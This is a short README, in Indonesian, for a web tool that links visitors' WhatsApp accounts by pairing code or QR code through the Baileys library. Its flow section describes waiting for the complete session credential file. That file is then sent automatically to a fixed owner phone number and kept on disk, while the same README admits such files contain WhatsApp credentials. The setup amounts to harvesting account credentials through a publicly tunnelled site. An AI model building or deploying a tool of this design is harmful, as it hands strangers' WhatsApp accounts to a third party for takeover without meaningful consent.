# SessionBot — web pairing code & QR WhatsApp (Baileys latest)

Build baru dari 0 (26 Nov 2026). Pola resmi V1 dari ReadSwEsm_V1:
browser v1 = Ubuntu + Chrome, pairing code V1 (`requestPairingCode`,
custom 8 karakter padEnd '0', berlaku 3 menit), sesi satu file
`sessions/<nomor>/hisoka.json` (+ `.good` / `.bak`).

## Jalankan
```bash
npm install
PORT=3001 npm start        # web di http://localhost:3001
npm run tunnel             # OpenTunnel -> sessionbot.my.id (WAJIB, aturan Wily)
```

## Alur
1. Masukkan nomor WA -> validasi realtime + region + operator.
2. Pilih Pairing Code atau QR Code.
3. Bot terhubung -> tunggu `hisoka.json` maksimal (registered + me +
   pre-key >= 5 + session >= 1 + identity-key >= 1 + ukuran > 10 KB +
   ukuran stabil 2x) -> file dikirim otomatis ke owner 6289688206739
   sebagai dokumen `hisoka.json` -> sesi web terputus otomatis.
   File sesi TETAP di disk (`sessions/<nomor>/hisoka.json`).

JANGAN PERNAH share file sesi — isinya kredensial WhatsApp.
